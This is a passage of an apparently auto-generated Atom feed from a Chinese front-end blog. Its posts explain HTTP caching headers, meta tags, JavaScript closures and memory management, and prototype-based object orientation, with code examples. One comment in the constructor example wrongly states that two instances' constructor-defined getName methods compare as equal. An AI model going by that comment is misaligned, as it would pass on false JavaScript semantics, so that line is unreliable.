<h2 id="关于浏览器缓存"><a href="#关于浏览器缓存" class="headerlink" title="关于浏览器缓存"></a>关于浏览器缓存</h2><p><strong>Last-modified 服务器端文件的最后修改时间</strong></p>
<p>当浏览器再次进行请求时，会向服务器传送<code>If-Modified-Since</code>报头，<strong>询问Last-Modified时间点之后资源是否被修改过</strong>。</p>
<p>如果没有修改，则返回码为304，使用缓存。</p>
<p>如果修改过，则再次去服务器请求资源，返回码和首次请求相同为200，资源为服务器最新资源。</p>
<p><strong>ETag</strong></p>
<p>当客户端发送请求该页面后，服务器返回该页面与对应的ETag，当客户端再次请求该页面时，使用<code>if-None-Match</code>将ETag传回原服务器，服务器会对ETag进行检查（一定程度上会增加服务器的开销），一致的话，返回304+空响应，使用本地缓存。</p>
<p>使用ETag可以解决Last-modified存在的一些问题：</p>
<ul>
<li>某些服务器不能精确得到资源的最后修改时间，这样就无法通过最后修改时间判断资源是否更新</li>
<li>如果资源修改非常频繁，在秒以下的时间内进行修改，而Last-modified只能精确到秒</li>
<li>一些资源的最后修改时间改变了，但是内容没改变，使用ETag就认为资源还是没有修改的。</li>
</ul>
<p><strong>LocalStorage与sessionStorage</strong></p>
<p>LocalStorage是一种本地存储的公共资源，遵守跨域安全策略，如果有多个等价域名之间的LocalStorage不互通，则会造成多份相同缓存。缓存是以数据库文件的形式存放在本地的。</p>
<p>LocalStorage在PC上的兼容性不太好，而且当网络速度快、协商缓存响应快时使用localStorage的速度比不上304，并且不能缓存css文件。而移动端由于网速慢，使用localStorage要快于304。</p>
<p>注意: Cache-Control、Expires是本地缓存，Last-modified、ETag是协商缓存。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://www.alloyteam.com/2016/03/discussion-on-web-caching/" target="_blank" rel="external">浅谈web缓存</a></p>
<p><a href="https://segmentfault.com/a/1190000002407912" target="_blank" rel="external">常用meta整理</a></p>
<p><a href="http://www.xiaocaoge.com/understanding-viewport-and-device-width.html?utm_source=tuicool&amp;utm_medium=referral" target="_blank" rel="external">理解viewport与device-width</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记得有一次做一个移动端网页时，无论是上线还是chrome F12移动端查看都无法正常响应式展现，只有在PC浏览器上缩放才行。后来才发现需要在head的meta里加一个viewport。这也让我第一次注意到了不起眼的meta，原来它暗藏许多的玄机，这里我们来总结一下！&lt;/p&gt;
&lt;p&gt;meta标签提供关于HTML文档的元数据。元数据不会显示在页面上，但对于机器是可读的。它可用于浏览器(如何显示内容或重新加载页面)，搜索引擎(关键词)，或其他web服务。&lt;/p&gt;
&lt;h2 id=&quot;name-把content属性关联到一个名称&quot;&gt;&lt;a href=&quot;#name-把content属性关联到一个名称&quot; class=&quot;headerlink&quot; title=&quot;name - 把content属性关联到一个名称&quot;&gt;&lt;/a&gt;name - 把content属性关联到一个名称&lt;/h2&gt;&lt;p&gt;主要用于一些SEO优化&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;author 网站作者&lt;/li&gt;
&lt;li&gt;description 网站描述&lt;/li&gt;
&lt;li&gt;keywords 网站关键词&lt;/li&gt;
&lt;li&gt;…&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;例如: &lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;meta name=&amp;quot;description&amp;quot; content=&amp;quot;the blog of Blackganglion&amp;quot;&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;&amp;lt;meta name=&amp;quot;author&amp;quot; content=&amp;quot;BlackGanglion&amp;quot;&amp;gt;&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="前端基本功" scheme="http://blackganglion.com/categories/%E5%89%8D%E7%AB%AF%E5%9F%BA%E6%9C%AC%E5%8A%9F/"/>
    
    
      <category term="meta" scheme="http://blackganglion.com/tags/meta/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript作用域、闭包与内存管理</title>
    <link href="http://blackganglion.com/2016/03/10/JavaScript%E4%BD%9C%E7%94%A8%E5%9F%9F%E3%80%81%E9%97%AD%E5%8C%85%E4%B8%8E%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    <id>http://blackganglion.com/2016/03/10/JavaScript作用域、闭包与内存管理/</id>
    <published>2016-03-10T15:28:00.000Z</published>
    <updated>2016-07-08T14:11:21.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本类型值"><a href="#基本类型值" class="headerlink" title="基本类型值"></a>基本类型值</h2><p>Undefined、Null、Boolean、Number和String，按值来保存。复制基本类型值时，会完全复制出一个独立的变量。</p>
<h2 id="引用类型值（对象）"><a href="#引用类型值（对象）" class="headerlink" title="引用类型值（对象）"></a>引用类型值（对象）</h2><p>保存在内存中的对象，按引用访问。复制引用类型值时，副本其实是一个指针，指向堆内存中的对象，两者其实指向同一对象。</p>
<p>在函数传递参数时，参数都是按值传递的。当参数为对象时，虽然是值传递，但还是会按引用来访问同一个对象。内部可修改引用，但对外部将不会产生影响。</p>
<p>每个函数都有自己的执行环境（之前this文章里已经提过了，也就是执行上下文），当执行流进入一个函数时，函数环境就会被推入一个环境栈。函数执行后，栈将其环境弹出，把控制权返回给之前的执行环境。当代码在一个环境中执行时，会创建变量对象的一个<code>作用域链</code>，其可以保证对执行环境有权访问的所有变量和函数的有序访问。变量对象搜索的过程就是从前向后遍历作用域链的过程。</p>
<p>作用域链: 当前函数环境（argument…) -&gt; 上级外部环境 -&gt; 上上级外部环境</p>
<a id="more"></a>
<hr>
<p>由于这样的机制，我们发现我们无法访问到函数内部的变量，因为作用域链总是向上的。因而产生了闭包，先看一下闭包的概念:</p>
<blockquote>
<p>闭包(Closure)是词法闭包(Lexical Closure)的简称，是引用了自由变量的函数。这个被引用的自由变量将和这个函数一同存在，即使已经离开了创造它的环境也不例外.</p>
</blockquote>
<h3 id="方法一-返回函数"><a href="#方法一-返回函数" class="headerlink" title="方法一(返回函数):"></a>方法一(返回函数):</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> b = <span class="number">1</span>;</div><div class="line"></div><div class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> b;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="built_in">console</span>.log(a()());</div></pre></td></tr></table></figure>
<h3 id="方法二-利用回调函数"><a href="#方法二-利用回调函数" class="headerlink" title="方法二(利用回调函数):"></a>方法二(利用回调函数):</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params">callback</span>)</span>&#123;</div><div class="line">  <span class="keyword">var</span> d = <span class="number">2</span>;</div><div class="line">  callback(d);</div><div class="line">&#125;</div><div class="line"></div><div class="line">c(<span class="function"><span class="keyword">function</span>(<span class="params">k</span>)</span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(k);</div><div class="line">&#125;)</div></pre></td></tr></table></figure>
<h3 id="方法三-返回对象"><a href="#方法三-返回对象" class="headerlink" title="方法三(返回对象):"></a>方法三(返回对象):</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="keyword">var</span> f = <span class="number">10</span>;</div><div class="line"></div><div class="line">  <span class="keyword">return</span> &#123;</div><div class="line">    get: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">      <span class="keyword">return</span> f;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="built_in">console</span>.log(e().get());</div></pre></td></tr></table></figure>
<h2 id="方法四-执行外部函数"><a href="#方法四-执行外部函数" class="headerlink" title="方法四(执行外部函数):"></a>方法四(执行外部函数):</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="keyword">var</span> b = <span class="number">3</span>;</div><div class="line">  c(b);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params">res</span>)</span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(res);</div><div class="line">&#125;</div><div class="line"></div><div class="line">a();</div></pre></td></tr></table></figure>
<h3 id="方法五-在函数声明中不加var"><a href="#方法五-在函数声明中不加var" class="headerlink" title="方法五(在函数声明中不加var):"></a>方法五(在函数声明中不加var):</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> b = <span class="number">6</span>;</div><div class="line">  get = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">return</span> b;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">a();</div><div class="line"><span class="built_in">console</span>.log(get());</div></pre></td></tr></table></figure>
<p>主要目的在于将函数内部的函数传递到其所在词法作用域之外，它都会持有对原始定义作用域的引用，通过它就可以访问函数内部的变量。一般函数在执行后其作用域就会被销毁，引擎使用垃圾回收器释放不再使用的内存空间。但由于闭包的存在，仍可以从外部访问到函数作用域内部，保持着这个引用，所以闭包也可能导致内存的泄露。</p>
<p>经典例子，这样会输出5个6：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++) &#123;</div><div class="line">  <span class="comment">// timer函数都共享对i的引用</span></div><div class="line">  setTimeout( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="comment">// timer function 属于独立的一个函数作用域</span></div><div class="line">    <span class="comment">// i变量需要沿着作用域链向上级环境寻找i值</span></div><div class="line">    <span class="built_in">console</span>.log(i);</div><div class="line">  &#125;, i * <span class="number">1000</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++) &#123;</div><div class="line">  <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="comment">// 1,2,3,4,5</span></div><div class="line">    <span class="built_in">console</span>.log(i); </div><div class="line">  &#125;</div><div class="line">  test();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里我认为原因与setTimeOut也有一定的关系，setTimeout执行是浏览器开定时器线程，过setTimeout设置的时间后，向浏览器的事件队列插入执行的函数，js引擎线程执行完当前所有代码之后，开始执行事件队列里的代码，此时引用的i已经为6了。</p>
<p>正确的写法应该是利用一个IIFE(立即执行函数表达式):</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++) &#123;</div><div class="line">  (<span class="function"><span class="keyword">function</span>(<span class="params">i</span>)</span>&#123;</div><div class="line">    setTimeout( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>) </span>&#123;</div><div class="line">      <span class="built_in">console</span>.log(i);</div><div class="line">    &#125;, i * <span class="number">1000</span>);</div><div class="line">  &#125;)(i);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>另外，在ECMAScript中只采用静态作用域，闭包是一系列函数，并且静态保存所有父级的作用域。通过这些保存的作用域来搜寻到函数中的自由变量。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> x = <span class="number">10</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(x);</div><div class="line">&#125;</div><div class="line"></div><div class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">funArg</span>) </span>&#123;</div><div class="line"></div><div class="line">  <span class="keyword">var</span> x = <span class="number">20</span>;</div><div class="line"></div><div class="line">  <span class="comment">// 这里我们需要关注funArg，也就是foo是在哪里定义的，而不是在哪里调用的，因为js只有静态作用域</span></div><div class="line">  <span class="comment">// 但要注意this，this却类似于动态作用域</span></div><div class="line">  <span class="comment">// 10, 而不是20</span></div><div class="line">  funArg();</div><div class="line"></div><div class="line">&#125;)(foo);</div></pre></td></tr></table></figure>
<p>总之，闭包是代码块和创建该代码块的上下文中数据的结合，可以说所有的函数都是闭包，在它们定义时就已经保存了上层上下文的作用域链。</p>
<hr>
<p>JavaScript自动分配内存，也由垃圾回收器自动回收，找出不再继续使用的变量，然后释放其占用内存，固定时间，周期执行操作。</p>
<h2 id="标记清除"><a href="#标记清除" class="headerlink" title="标记清除"></a>标记清除</h2><p>先会给存储在内存中的所有变量加上标记，去掉环境中的变量以及被环境中的变量引用的变量的标记。此后若再次被标记的变量将被清除，它们已经被认为是无法访问到的了，也就不需要了。</p>
<h2 id="引用计数"><a href="#引用计数" class="headerlink" title="引用计数"></a>引用计数</h2><p>值被引用一次，计数就加一，被赋予其它值，计数就减一，当计数为0时，说明无法被访问，那么就回收内存。但会发生循环引用，内存就无法回收，从而造成内存泄露。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;基本类型值&quot;&gt;&lt;a href=&quot;#基本类型值&quot; class=&quot;headerlink&quot; title=&quot;基本类型值&quot;&gt;&lt;/a&gt;基本类型值&lt;/h2&gt;&lt;p&gt;Undefined、Null、Boolean、Number和String，按值来保存。复制基本类型值时，会完全复制出一个独立的变量。&lt;/p&gt;
&lt;h2 id=&quot;引用类型值（对象）&quot;&gt;&lt;a href=&quot;#引用类型值（对象）&quot; class=&quot;headerlink&quot; title=&quot;引用类型值（对象）&quot;&gt;&lt;/a&gt;引用类型值（对象）&lt;/h2&gt;&lt;p&gt;保存在内存中的对象，按引用访问。复制引用类型值时，副本其实是一个指针，指向堆内存中的对象，两者其实指向同一对象。&lt;/p&gt;
&lt;p&gt;在函数传递参数时，参数都是按值传递的。当参数为对象时，虽然是值传递，但还是会按引用来访问同一个对象。内部可修改引用，但对外部将不会产生影响。&lt;/p&gt;
&lt;p&gt;每个函数都有自己的执行环境（之前this文章里已经提过了，也就是执行上下文），当执行流进入一个函数时，函数环境就会被推入一个环境栈。函数执行后，栈将其环境弹出，把控制权返回给之前的执行环境。当代码在一个环境中执行时，会创建变量对象的一个&lt;code&gt;作用域链&lt;/code&gt;，其可以保证对执行环境有权访问的所有变量和函数的有序访问。变量对象搜索的过程就是从前向后遍历作用域链的过程。&lt;/p&gt;
&lt;p&gt;作用域链: 当前函数环境（argument…) -&amp;gt; 上级外部环境 -&amp;gt; 上上级外部环境&lt;/p&gt;
    
    </summary>
    
      <category term="前端基本功" scheme="http://blackganglion.com/categories/%E5%89%8D%E7%AB%AF%E5%9F%BA%E6%9C%AC%E5%8A%9F/"/>
    
    
      <category term="JavaScript基础" scheme="http://blackganglion.com/tags/JavaScript%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript中的面向对象</title>
    <link href="http://blackganglion.com/2016/03/10/JavaScript%E4%B8%AD%E7%9A%84%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
    <id>http://blackganglion.com/2016/03/10/JavaScript中的面向对象/</id>
    <published>2016-03-10T06:46:00.000Z</published>
    <updated>2016-07-30T13:36:04.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="对象的定义"><a href="#对象的定义" class="headerlink" title="对象的定义"></a>对象的定义</h2><p>无序属性的集合，其属性可以包含基本值、对象或函数。可以将对象想象成散列表，即一组名值对，值可以是数据或是函数</p>
<h2 id="属性设置"><a href="#属性设置" class="headerlink" title="属性设置"></a>属性设置</h2><p>采用Object.defineProperty() 方法直接在一个对象上定义一个新属性，或者修改一个已经存在的属性，并返回这个对象。</p>
<blockquote>
<p>Object.defineProperty(obj, prop, descriptor)</p>
</blockquote>
<ul>
<li>obj 需要定义属性的对象。</li>
<li>prop 需被定义或修改的属性名。</li>
<li>descriptor 需被定义或修改的属性的描述符。</li>
</ul>
<p>属性主要分为两种: 数据属性和访问器属性</p>
<p><strong>configurable: </strong>当且仅当该属性的configurable为true时，该属性才能够被改变，也能够被删除，默认为false。</p>
<p><strong>enumerable: </strong>当且仅当该属性的enumerable为true时，该属性才能够出现在对象的枚举属性中，默认为false。</p>
<p><strong>value: </strong>该属性对应的值。可以是任何有效的JavaScript值（数值，对象，函数等），默认为undefined。</p>
<p><strong>writable: </strong>当且仅当该属性的writable为true时，该属性才能被赋值运算符改变，默认为false。</p>
<a id="more"></a>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> person = &#123;</div><div class="line">  age: <span class="number">11</span>,</div><div class="line">  sex: <span class="string">'man'</span></div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="built_in">Object</span>.defineProperty(person, <span class="string">'height'</span>, &#123;</div><div class="line">  value: <span class="number">198</span></div><div class="line">&#125;);</div><div class="line"></div><div class="line"><span class="keyword">for</span>(<span class="keyword">var</span> v <span class="keyword">in</span> person)&#123;</div><div class="line">  <span class="built_in">console</span>.log(v); <span class="comment">// age, sex, 体现enumerable</span></div><div class="line">&#125;</div><div class="line">person.height = <span class="number">3</span>;</div><div class="line"><span class="built_in">console</span>.log(person.height); <span class="comment">// 198, 体现writable</span></div><div class="line"><span class="keyword">delete</span> person.height;</div><div class="line"><span class="built_in">console</span>.log(person.height); <span class="comment">// 198, 体现configurable</span></div></pre></td></tr></table></figure>
<p><strong>get: </strong>一个给属性提供getter的方法，如果没有getter则为undefined。该方法返回值被用作属性值。默认为undefined。</p>
<p><strong>set: </strong>一个给属性提供setter的方法，如果没有setter则为undefined。该方法将接受唯一参数，并将该参数的新值分配给该属性。默认为undefined。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> book = &#123;</div><div class="line">  _year: <span class="number">2004</span>, <span class="comment">// 表示只能通过对象方法访问的属性</span></div><div class="line">  edition: <span class="number">1</span></div><div class="line">&#125;</div><div class="line"><span class="built_in">Object</span>.defineProperty(book, <span class="string">"year"</span>, &#123;</div><div class="line">  get: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">this</span>._year;</div><div class="line">  &#125;,</div><div class="line">  set: <span class="function"><span class="keyword">function</span>(<span class="params">newValue</span>) </span>&#123;</div><div class="line">    <span class="keyword">if</span>(newValue &gt; <span class="number">2004</span>)&#123;</div><div class="line">      <span class="keyword">this</span>._year = newValue;</div><div class="line">      <span class="keyword">this</span>.edition += newValue - <span class="number">2004</span>;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;);</div><div class="line">book.year = <span class="number">2005</span>;</div><div class="line">alert(book.edition); <span class="comment">// 2</span></div><div class="line"><span class="built_in">console</span>.log(book.edition);</div><div class="line"><span class="keyword">for</span>(<span class="keyword">var</span> attr <span class="keyword">in</span> book)&#123;</div><div class="line">  <span class="built_in">console</span>.log(attr); <span class="comment">// _year, edition</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><p>调用构造函数会经历的四个步骤，此前在this的文章中已经讲过，这里再复习一下：</p>
<ul>
<li>创建一个新的<code>对象</code></li>
<li>将构造函数的作用域赋给新对象（this就指向这个新对象了）</li>
<li>执行构造函数中的代码（添加属性）</li>
<li>返回新的对象</li>
</ul>
<p>看下面的代码:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name, age</span>) </span>&#123;</div><div class="line">  <span class="keyword">this</span>.name = name;</div><div class="line">  <span class="keyword">this</span>.age = age;</div><div class="line">  <span class="keyword">this</span>.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person(<span class="string">"Tom"</span>, <span class="number">12</span>);</div><div class="line"><span class="built_in">console</span>.log(person1.constructor == Person); <span class="comment">// true</span></div><div class="line"><span class="built_in">console</span>.log(person1 <span class="keyword">instanceof</span> <span class="built_in">Object</span> &amp;&amp; person1 <span class="keyword">instanceof</span> Person); <span class="comment">// true</span></div><div class="line"></div><div class="line"><span class="keyword">var</span> person2 = <span class="keyword">new</span> Person(<span class="string">"Jom"</span>, <span class="number">13</span>);</div><div class="line"><span class="built_in">console</span>.log(person1.getName == person2.getName); <span class="comment">// true</span></div></pre></td></tr></table></figure>
<h2 id="原型模式"><a href="#原型模式" class="headerlink" title="原型模式"></a>原型模式</h2><p>使用构造函数模式，我们发现构造函数中的每个对象方法都要在实例上重新创造一遍，都new Function()，可用原型模式解决，它的好处在于可以让所有实例共享它包含的属性与方法.</p>
<p>与原型有关的重要方法</p>
<p><strong>isPrototypeOf()</strong></p>
<blockquote>
<p>object1.isPrototypeOf(object2)</p>
</blockquote>
<p>object1是否在object2的原型链中</p>
<p><strong>Object.getPrototypeOf()(ES5)</strong></p>
<blockquote>
<p>Object.getPrototypeOf(object)</p>
</blockquote>
<p>返回指定方法的原型</p>
<p><strong>Object.prototype.hasOwnProperty()</strong></p>
<blockquote>
<p>obj.hasOwnProperty(prop)</p>
</blockquote>
<p>用来判断某个对象是否含有指定的自身属性</p>
<p><strong>in</strong></p>
<p>in操作符可以单独使用或在for-in循环中使用，无论属性存在于实例还是原型中，但必须为可遍历的</p>
<p><strong>Object.keys()(ES5)</strong></p>
<p>返回一个由给定对象的所有可枚举自身属性的属性名组成的数组</p>
<p><strong>Object.getOwnPropertyDescriptor()</strong></p>
<blockquote>
<p>Object.getOwnPropertyDescriptor(obj, prop)</p>
</blockquote>
<p>返回指定对象上一个自有属性对应的属性描述符</p>
<p>多个实例共享所保存的属性和方法的基本原理：当读取某个对象的某个属性时，都会进行一次搜索，先从本身实例开始，若在实例中找到改名字的属性，则返回，若没有找到，则继续搜索，指针指向原型对象，但是要注意，这样可能会产生实例对象屏蔽原型对象的情况发生.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name, age</span>) </span>&#123;</div><div class="line">  <span class="keyword">this</span>.name = name;</div><div class="line">  <span class="keyword">this</span>.age = age;</div><div class="line">  <span class="keyword">this</span>.getAge = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.age + <span class="number">5</span>);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">Person.prototype.getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</div><div class="line">&#125;</div><div class="line"></div><div class="line">Person.prototype.getAge = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span>.age);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> Person(<span class="string">"Tom"</span>, <span class="number">12</span>);</div><div class="line"><span class="keyword">var</span> person2 = <span class="keyword">new</span> Person(<span class="string">"Jom"</span>, <span class="number">13</span>);</div><div class="line"><span class="built_in">console</span>.log(person1.getName == person2.getName);</div><div class="line"></div><div class="line"><span class="built_in">console</span>.log(person1.__proto__); <span class="comment">// Person()</span></div><div class="line"><span class="built_in">console</span>.log(person1.constructor); <span class="comment">// function Person()</span></div><div class="line"><span class="built_in">console</span>.log(Person.prototype); <span class="comment">// Person()</span></div><div class="line"><span class="built_in">console</span>.log(Person.prototype.constructor); <span class="comment">//// function Person()</span></div><div class="line"></div><div class="line">person1.getAge(); <span class="comment">// 17而不是12</span></div><div class="line"></div><div class="line"><span class="built_in">console</span>.log(Person.prototype.isPrototypeOf(person2)); <span class="comment">// true</span></div><div class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.getPrototypeOf(person1)); <span class="comment">// Person()</span></div><div class="line"><span class="built_in">console</span>.log(person1.hasOwnProperty(<span class="string">"getAge"</span>)); <span class="comment">// ture</span></div><div class="line"><span class="built_in">console</span>.log(person1.hasOwnProperty(<span class="string">"getName"</span>)); <span class="comment">// false</span></div><div class="line"><span class="built_in">console</span>.log(<span class="string">"getName"</span> <span class="keyword">in</span> person1); <span class="comment">// true</span></div><div class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.keys(person1)); <span class="comment">// ["name", "age", "getAge"]</span></div><div class="line"><span class="built_in">console</span>.log(<span class="built_in">Object</span>.getOwnPropertyDescriptor(person1, <span class="string">"name"</span>)); <span class="comment">// Object &#123;value: "Tom", writable: true, enumerable: true, configurable: true&#125;</span></div></pre></td></tr></table></figure>
<p>重整原型函数，封装原型的功能，但会出现一些问题</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 组合使用构造函数模式和原型模式</span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params">name, age</span>) </span>&#123;</div><div class="line">  <span class="keyword">this</span>.name = name;</div><div class="line">  <span class="keyword">this</span>.age = age;</div><div class="line">&#125;</div><div class="line"></div><div class="line">Person.prototype = &#123;</div><div class="line">  getName: <span class="function"><span 